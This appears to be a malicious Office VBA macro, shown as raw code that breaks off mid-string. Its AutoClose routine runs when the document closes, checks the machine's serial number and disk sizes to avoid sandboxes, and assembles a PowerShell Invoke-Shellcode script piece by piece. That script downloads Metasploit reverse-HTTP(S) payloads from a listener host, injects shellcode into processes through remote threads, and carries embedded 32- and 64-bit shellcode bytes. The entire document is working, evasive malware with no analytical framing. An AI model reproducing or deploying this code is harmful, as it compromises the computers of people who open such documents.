Sub AutoClose()
        xYx
End Sub

Public Function xYx() As Variant
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        Set ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")
        For Each objItem In ID
                If StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End
        Next
        Set disksize = objWMIService.ExecQuery("Select Size from Win32_logicaldisk")
        For Each objItem In disksize
                If (objItem.Size = 42949603328#) Then End
                If (objItem.Size = 68719443968#) Then End
        Next
        Dim Mgm As String
        Mgm = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        Mgm = Mgm + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        Mgm = Mgm + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        Mgm = Mgm + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        Mgm = Mgm + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        Mgm = Mgm + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        Mgm = Mgm + "    $Shellcode,
    [Parameter( ParameterSetName ="
        Mgm = Mgm + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        Mgm = Mgm + "reter/reverse_http',
                  'windows/me"
        Mgm = Mgm + "terpreter/reverse_https',
                  Ignore"
        Mgm = Mgm + "Case = $True )]
    [String]
    $Payload = 'windo"
        Mgm = Mgm + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        Mgm = Mgm + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        Mgm = Mgm + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        Mgm = Mgm + " = $True,
                ParameterSetName = 'Meta"
        Mgm = Mgm + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        Mgm = Mgm + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        Mgm = Mgm + "datory = $True,
                ParameterSetName ="
        Mgm = Mgm + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        Mgm = Mgm + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        Mgm = Mgm + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        Mgm = Mgm + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        Mgm = Mgm + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        Mgm = Mgm + "sion\Internet Settings').'User Agent',
    [Parame"
        Mgm = Mgm + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        Mgm = Mgm + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        Mgm = Mgm + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        Mgm = Mgm + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        Mgm = Mgm + "$False,
    [Switch]
    $Force = $False
)
    Set"
        Mgm = Mgm + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        Mgm = Mgm + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        Mgm = Mgm + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        Mgm = Mgm + "meters['Payload'].Attributes |
            Where-O"
        Mgm = Mgm + "bject {$_.TypeId -eq [System.Management.Automation"
        Mgm = Mgm + ".ValidateSetAttribute]}
        foreach ($Payload "
        Mgm = Mgm + "in $AvailablePayloads.ValidValues)
        {
     "
        Mgm = Mgm + "       New-Object PSObject -Property @{ Payloads ="
        Mgm = Mgm + " $Payload }
        }
        Return
    }
    if "
        Mgm = Mgm + "( $PSBoundParameters['ProcessID'] )
    {
        "
        Mgm = Mgm + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        Mgm = Mgm + "-Null
    }
    function Local:Get-DelegateType
  "
        Mgm = Mgm + "  {
        Param
        (
            [OutputTyp"
        Mgm = Mgm + "e([Type])]
            [Parameter( Position = 0)]
"
        Mgm = Mgm + "            [Type[]]
            $Parameters = (Ne"
        Mgm = Mgm + "w-Object Type[](0)),
            [Parameter( Posit"
        Mgm = Mgm + "ion = 1 )]
            [Type]
            $ReturnT"
        Mgm = Mgm + "ype = [Void]
        )
        $Domain = [AppDomai"
        Mgm = Mgm + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        Mgm = Mgm + "t System.Reflection.AssemblyName('ReflectedDelegat"
        Mgm = Mgm + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        Mgm = Mgm + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        Mgm = Mgm + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        Mgm = Mgm + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        Mgm = Mgm + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        Mgm = Mgm + "der.DefineType('MyDelegateType', 'Class, Public, S"
        Mgm = Mgm + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        Mgm = Mgm + "egate])
        $ConstructorBuilder = $TypeBuilder"
        Mgm = Mgm + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        Mgm = Mgm + "ic', [System.Reflection.CallingConventions]::Stand"
        Mgm = Mgm + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        Mgm = Mgm + "mplementationFlags('Runtime, Managed')
        $Me"
        Mgm = Mgm + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        Mgm = Mgm + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        Mgm = Mgm + ", $Parameters)
        $MethodBuilder.SetImplement"
        Mgm = Mgm + "ationFlags('Runtime, Managed')
        Write-Outpu"
        Mgm = Mgm + "t $TypeBuilder.CreateType()
    }
    function Loc"
        Mgm = Mgm + "al:Get-ProcAddress
    {
        Param
        (
 "
        Mgm = Mgm + "           [OutputType([IntPtr])]
            [Par"
        Mgm = Mgm + "ameter( Position = 0, Mandatory = $True )]
       "
        Mgm = Mgm + "     [String]
            $Module,
            [Pa"
        Mgm = Mgm + "rameter( Position = 1, Mandatory = $True )]
      "
        Mgm = Mgm + "      [String]
            $Procedure
        )
  "
        Mgm = Mgm + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        Mgm = Mgm + ".GetAssemblies() |
            Where-Object { $_.G"
        Mgm = Mgm + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        Mgm = Mgm + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        Mgm = Mgm + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        Mgm = Mgm + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        Mgm = Mgm + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        Mgm = Mgm + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        Mgm = Mgm + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        Mgm = Mgm + "eropServices.HandleRef], [String]))
        $Kern3"
        Mgm = Mgm + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        Mgm = Mgm + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        Mgm = Mgm + "ndleRef = New-Object System.Runtime.InteropService"
        Mgm = Mgm + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        Mgm = Mgm + "Output $GetProcAddress.Invoke($null, @([System.Run"
        Mgm = Mgm + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        Mgm = Mgm + "ure))
    }
    function Local:Emit-CallThreadStub"
        Mgm = Mgm + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        Mgm = Mgm + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        Mgm = Mgm + "chitecture / 8
        function Local:ConvertTo-Li"
        Mgm = Mgm + "ttleEndian ([IntPtr] $Address)
        {
         "
        Mgm = Mgm + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        Mgm = Mgm + "           $Address.ToString("X$($IntSizePtr*2)") "
        Mgm = Mgm + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        Mgm = Mgm + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        Mgm = Mgm + " } }
            [System.Array]::Reverse($LittleEn"
        Mgm = Mgm + "dianByteArray)
            Write-Output $LittleEnd"
        Mgm = Mgm + "ianByteArray
        }
        $CallStub = New-Obj"
        Mgm = Mgm + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        Mgm = Mgm + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        Mgm = Mgm + "                   # MOV   QWORD RAX, &shellcode
 "
        Mgm = Mgm + "           $CallStub += ConvertTo-LittleEndian $Ba"
        Mgm = Mgm + "seAddr       # &shellcode
            $CallStub +="
        Mgm = Mgm + " 0xFF,0xD0                              # CALL  RA"
        Mgm = Mgm + "X
            $CallStub += 0x6A,0x00              "
        Mgm = Mgm + "                # PUSH  BYTE 0
            $CallSt"
        Mgm = Mgm + "ub += 0x48,0xB8                              # MOV"
        Mgm = Mgm + "   QWORD RAX, &ExitThread
            $CallStub +="
        Mgm = Mgm + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        Mgm = Mgm + "ead
            $CallStub += 0xFF,0xD0            "
        Mgm = Mgm + "                  # CALL  RAX
        }
        el"
        Mgm = Mgm + "se
        {
            [Byte[]] $CallStub = 0xB8"
        Mgm = Mgm + "                           # MOV   DWORD EAX, &she"
        Mgm = Mgm + "llcode
            $CallStub += ConvertTo-LittleEn"
        Mgm = Mgm + "dian $BaseAddr       # &shellcode
            $Cal"
        Mgm = Mgm + "lStub += 0xFF,0xD0                              # "
        Mgm = Mgm + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        Mgm = Mgm + "                        # PUSH  BYTE 0
           "
        Mgm = Mgm + " $CallStub += 0xB8                                "
        Mgm = Mgm + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        Mgm = Mgm + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        Mgm = Mgm + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        Mgm = Mgm + "                          # CALL  EAX
        }
  "
        Mgm = Mgm + "      Write-Output $CallStub
    }
    function Lo"
        Mgm = Mgm + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        Mgm = Mgm + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        Mgm = Mgm + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        Mgm = Mgm + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        Mgm = Mgm + "        Throw "Unable to open a process handle for"
        Mgm = Mgm + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        Mgm = Mgm + "lse
        if ($64bitCPU) # Only perform theses c"
        Mgm = Mgm + "hecks if CPU is 64-bit
        {
            $IsWo"
        Mgm = Mgm + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        Mgm = Mgm + "-Null
            if ((!$IsWow64) -and $PowerShell"
        Mgm = Mgm + "32bit)
            {
                Throw 'Unable"
        Mgm = Mgm + " to inject 64-bit shellcode from within 32-bit Pow"
        Mgm = Mgm + "ershell. Use the 64-bit version of Powershell if y"
        Mgm = Mgm + "ou want this to work.'
            }
            e"
        Mgm = Mgm + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        Mgm = Mgm + "  {
                if ($Shellcode32.Length -eq 0)"
        Mgm = Mgm + "
                {
                    Throw 'No s"
        Mgm = Mgm + "hellcode was placed in the $Shellcode32 variable!'"
        Mgm = Mgm + "
                }
                $Shellcode = $S"
        Mgm = Mgm + "hellcode32
            }
            else # 64-bit"
        Mgm = Mgm + " process
            {
                if ($Shellc"
        Mgm = Mgm + "ode64.Length -eq 0)
                {
            "
        Mgm = Mgm + "        Throw 'No shellcode was placed in the $She"
        Mgm = Mgm + "llcode64 variable!'
                }
            "
        Mgm = Mgm + "    $Shellcode = $Shellcode64
            }
      "
        Mgm = Mgm + "  }
        else # 32-bit CPU
        {
          "
        Mgm = Mgm + "  if ($Shellcode32.Length -eq 0)
            {
   "
        Mgm = Mgm + "             Throw 'No shellcode was placed in the"
        Mgm = Mgm + " $Shellcode32 variable!'
            }
           "
        Mgm = Mgm + " $Shellcode = $Shellcode32
        }
        $Remo"
        Mgm = Mgm + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        Mgm = Mgm + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        Mgm = Mgm + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        Mgm = Mgm + ")
        {
            Throw "Unable to allocate "
        Mgm = Mgm + "shellcode memory in PID: $ProcessID"
        }
   "
        Mgm = Mgm + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        Mgm = Mgm + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        Mgm = Mgm + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        Mgm = Mgm + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        Mgm = Mgm + "      {
            $CallStub = Emit-CallThreadStu"
        Mgm = Mgm + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        Mgm = Mgm + "    else
        {
            $CallStub = Emit-Ca"
        Mgm = Mgm + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        Mgm = Mgm + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        Mgm = Mgm + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        Mgm = Mgm + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        Mgm = Mgm + "(!$RemoteStubAddr)
        {
            Throw "Un"
        Mgm = Mgm + "able to allocate thread call stub memory in PID: $"
        Mgm = Mgm + "ProcessID"
        }
        $WriteProcessMemory.I"
        Mgm = Mgm + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        Mgm = Mgm + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        Mgm = Mgm + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        Mgm = Mgm + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        Mgm = Mgm + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        Mgm = Mgm + "  {
            Throw "Unable to launch remote thr"
        Mgm = Mgm + "ead in PID: $ProcessID"
        }
        $CloseHa"
        Mgm = Mgm + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        Mgm = Mgm + "on Local:Inject-LocalShellcode
    {
        if ($"
        Mgm = Mgm + "PowerShell32bit) {
            if ($Shellcode32.Le"
        Mgm = Mgm + "ngth -eq 0)
            {
                Throw 'N"
        Mgm = Mgm + "o shellcode was placed in the $Shellcode32 variabl"
        Mgm = Mgm + "e!'
                return
            }
         "
        Mgm = Mgm + "   $Shellcode = $Shellcode32
        }
        els"
        Mgm = Mgm + "e
        {
            if ($Shellcode64.Length -e"
        Mgm = Mgm + "q 0)
            {
                Throw 'No shell"
        Mgm = Mgm + "code was placed in the $Shellcode64 variable!'
   "
        Mgm = Mgm + "             return
            }
            $She"
        Mgm = Mgm + "llcode = $Shellcode64
        }
        $BaseAddre"
        Mgm = Mgm + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        Mgm = Mgm + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        Mgm = Mgm + "X)
        if (!$BaseAddress)
        {
          "
        Mgm = Mgm + "  Throw "Unable to allocate shellcode memory in PI"
        Mgm = Mgm + "D: $ProcessID"
        }
        [System.Runtime.I"
        Mgm = Mgm + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        Mgm = Mgm + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        Mgm = Mgm + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        Mgm = Mgm + "  if ($PowerShell32bit)
        {
            $Cal"
        Mgm = Mgm + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        Mgm = Mgm + "adAddr 32
        }
        else
        {
       "
        Mgm = Mgm + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        Mgm = Mgm + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        Mgm = Mgm + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        Mgm = Mgm + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        Mgm = Mgm + "X)
        if (!$CallStubAddress)
        {
      "
        Mgm = Mgm + "      Throw "Unable to allocate thread call stub.""
        Mgm = Mgm + "
        }
        [System.Runtime.InteropServices"
        Mgm = Mgm + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        Mgm = Mgm + "allStub.Length)
        $ThreadHandle = $CreateThr"
        Mgm = Mgm + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        Mgm = Mgm + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        Mgm = Mgm + "dHandle)
        {
            Throw "Unable to la"
        Mgm = Mgm + "unch thread."
        }
        $WaitForSingleObje"
        Mgm = Mgm + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        Mgm = Mgm + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        Mgm = Mgm + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        Mgm = Mgm + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        Mgm = Mgm + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        Mgm = Mgm + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        Mgm = Mgm + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        Mgm = Mgm + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        Mgm = Mgm + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        Mgm = Mgm + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        Mgm = Mgm + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        Mgm = Mgm + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        Mgm = Mgm + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        Mgm = Mgm + "  else
    {
        $64bitCPU = $false
    }
    "
        Mgm = Mgm + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        Mgm = Mgm + "l32bit = $true
    }
    else
    {
        $Power"
        Mgm = Mgm + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        Mgm = Mgm + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        Mgm = Mgm + "owerShell32bit) {
            $RootInvocation = $M"
        Mgm = Mgm + "yInvocation.Line
            $Response = $True
   "
        Mgm = Mgm + "         if ( $Force -or ( $Response = $psCmdlet.S"
        Mgm = Mgm + "houldContinue( "Do you want to launch the payload "
        Mgm = Mgm + "from x86 Powershell?",
                   "Attempt"
        Mgm = Mgm + " to execute 32-bit shellcode from 64-bit Powershel"
        Mgm = Mgm + "l. Note: This process takes about one minute. Be p"
        Mgm = Mgm + "atient! You will also see some artifacts of the sc"
        Mgm = Mgm + "ript loading in the other process." ) ) ) { }
    "
        Mgm = Mgm + "        if ( !$Response )
            {
          "
        Mgm = Mgm + "      Return
            }
            if ($MyInvo"
        Mgm = Mgm + "cation.BoundParameters['Force'])
            {
   "
        Mgm = Mgm + "             $Command = "function $($MyInvocation."
        Mgm = Mgm + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        Mgm = Mgm + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        Mgm = Mgm + "   }
            else
            {
              "
        Mgm = Mgm + "  $Command = "function $($MyInvocation.InvocationN"
        Mgm = Mgm + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        Mgm = Mgm + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        Mgm = Mgm + "
            $CommandBytes = [System.Text.Encoding"
        Mgm = Mgm + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        Mgm = Mgm + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        Mgm = Mgm + "           $Execute = '$Command' + " | $Env:windir"
        Mgm = Mgm + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        Mgm = Mgm + "oProfile -Command -"
            Invoke-Expression"
        Mgm = Mgm + " -Command $Execute | Out-Null
            Return
 "
        Mgm = Mgm + "       }
        $Response = $True
        if ( $F"
        Mgm = Mgm + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        Mgm = Mgm + "Do you know what you're doing?",
               "A"
        Mgm = Mgm + "bout to download Metasploit payload '$($Payload)' "
        Mgm = Mgm + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        Mgm = Mgm + "  if ( !$Response )
        {
            Return
 "
        Mgm = Mgm + "       }
        switch ($Payload)
        {
     "
        Mgm = Mgm + "       'windows/meterpreter/reverse_http'
        "
        Mgm = Mgm + "    {
                $SSL = ''
            }
    "
        Mgm = Mgm + "        'windows/meterpreter/reverse_https'
      "
        Mgm = Mgm + "      {
                $SSL = 's'
               "
        Mgm = Mgm + " [System.Net.ServicePointManager]::ServerCertifica"
        Mgm = Mgm + "teValidationCallback = {$True}
            }
     "
        Mgm = Mgm + "   }
        if ($Legacy)
        {
            $R"
        Mgm = Mgm + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        Mgm = Mgm + "
        } else {
            $CharArray = 48..57 "
        Mgm = Mgm + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        Mgm = Mgm + "         $SumTest = $False
            while ($Sum"
        Mgm = Mgm + "Test -eq $False)
            {
                $Ge"
        Mgm = Mgm + "neratedUri = $CharArray | Get-Random -Count 4
    "
        Mgm = Mgm + "            $SumTest = (([int[]] $GeneratedUri | M"
        Mgm = Mgm + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        Mgm = Mgm + "  }
            $RequestUri = -join $GeneratedUri
"
        Mgm = Mgm + "            $Request = "http$($SSL)://$($Lhost):$("
        Mgm = Mgm + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        Mgm = Mgm + "ew-Object Uri($Request)
        $WebClient = New-O"
        Mgm = Mgm + "bject System.Net.WebClient
        $WebClient.Head"
        Mgm = Mgm + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        Mgm = Mgm + "roxy)
        {
            $WebProxyObject = New-"
        Mgm = Mgm + "Object System.Net.WebProxy
            $ProxyAddre"
        Mgm = Mgm + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        Mgm = Mgm + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        Mgm = Mgm + "oxyServer
            if ($ProxyAddress)
         "
        Mgm = Mgm + "   {
                $WebProxyObject.Address = $Pr"
        Mgm = Mgm + "oxyAddress
                $WebProxyObject.UseDefa"
        Mgm = Mgm + "ultCredentials = $True
                $WebClientO"
        Mgm = Mgm + "bject.Proxy = $WebProxyObject
            }
      "
        Mgm = Mgm + "  }
        try
        {
            [Byte[]] $Sh"
        Mgm = Mgm + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        Mgm = Mgm + "}
        catch
        {
            Throw "$($Er"
        Mgm = Mgm + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        Mgm = Mgm + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        Mgm = Mgm + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        Mgm = Mgm + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        Mgm = Mgm + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        Mgm = Mgm + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        Mgm = Mgm + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        Mgm = Mgm + "                             0x52,0x0c,0x8b,0x52,0"
        Mgm = Mgm + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        Mgm = Mgm + "x31,0xc0,
                                  0xac,0"
        Mgm = Mgm + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        Mgm = Mgm + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        Mgm = Mgm + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        Mgm = Mgm + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        Mgm = Mgm + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        Mgm = Mgm + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        Mgm = Mgm + "x8b,
                                  0x01,0xd6,0"
        Mgm = Mgm + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        Mgm = Mgm + "x38,0xe0,0x75,0xf4,
                              "
        Mgm = Mgm + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        Mgm = Mgm + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        Mgm = Mgm + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        Mgm = Mgm + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        Mgm = Mgm + "                                  0x5b,0x5b,0x61,0"
        Mgm = Mgm + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        Mgm = Mgm + "xeb,0x86,0x5d,
                                  0"
        Mgm = Mgm + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        Mgm = Mgm + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        Mgm = Mgm + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        Mgm = Mgm + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        Mgm = Mgm + "                             0x80,0xfb,0xe0,0x75,0"
        Mgm = Mgm + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        Mgm = Mgm + "xd5,0x63,
                                  0x61,0"
        Mgm = Mgm + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        Mgm = Mgm + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        Mgm = Mgm + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        Mgm = Mgm + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        Mgm = Mgm + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        Mgm = Mgm + "                             0x20,0x48,0x8b,0x72,0"
        Mgm = Mgm + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        Mgm = Mgm + "x31,0xc0,
                                  0xac,0"
        Mgm = Mgm + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        Mgm = Mgm + "x41,0x01,0xc1,0xe2,0xed,
                         "
        Mgm = Mgm + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        Mgm = Mgm + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        Mgm = Mgm + "                        0x00,0x00,0x00,0x48,0x85,0"
        Mgm = Mgm + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        Mgm = Mgm + "x44,
                                  0x8b,0x40,0"
        Mgm = Mgm + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        Mgm = Mgm + "x8b,0x34,0x88,0x48,
                              "
        Mgm = Mgm + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        Mgm = Mgm + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        Mgm = Mgm + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        Mgm = Mgm + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        Mgm = Mgm + "                                  0x8b,0x40,0x24,0"
        Mgm = Mgm + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        Mgm = Mgm + "x40,0x1c,0x49,
                                  0"
        Mgm = Mgm + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        Mgm = Mgm + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        Mgm = Mgm + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        Mgm = Mgm + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        Mgm = Mgm + "                             0x59,0x5a,0x48,0x8b,0"
        Mgm = Mgm + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        Mgm = Mgm + "x00,0x00,
                                  0x00,0"
        Mgm = Mgm + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        Mgm = Mgm + "x00,0x41,0xba,0x31,0x8b,
                         "
        Mgm = Mgm + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        Mgm = Mgm + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        Mgm = Mgm + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        Mgm = Mgm + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        Mgm = Mgm + "x47,
                                  0x13,0x72,0"
        Mgm = Mgm + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        Mgm = Mgm + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        Mgm = Mgm + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
